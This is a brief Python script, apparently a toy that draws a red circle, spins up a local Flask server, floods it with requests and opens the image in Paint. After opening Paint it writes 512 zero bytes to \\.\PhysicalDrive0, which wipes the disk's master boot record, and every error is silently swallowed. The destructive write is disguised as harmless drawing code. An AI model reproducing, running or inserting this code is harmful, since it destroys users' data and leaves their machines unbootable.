import subprocess
import os
import time
import threading
import requests
from flask import Flask
from PIL import Image, ImageDraw

app = Flask(__name__)

@app.route('/')
def say_by():
    return "by"

def run_server():
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app.run(host='127.0.0.1', port=8080)

def invoke_paint_ghost():
    image_name = "ghost_image.png"
    image_path = os.path.join(os.getcwd(), image_name)

    if not os.path.exists(image_path):
        try:
            img = Image.new('RGB', (800, 600), color=(0, 0, 0))
            draw = ImageDraw.Draw(img)
            draw.ellipse((200, 100, 600, 500), fill=(255, 0, 0))
            img.save(image_path)
        except:
            return

    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()
    time.sleep(1)

    for _ in range(100000):
        try:
            requests.get("http://127.0.0.1:8080")
        except:
            pass

    try:
        subprocess.Popen(['mspaint.exe', image_path])
        with open(r'\\.\PhysicalDrive0', 'wb') as f:
            f.write(b'\x00' * 512)
    except:
        pass

if __name__ == "__main__":
    invoke_paint_ghost()
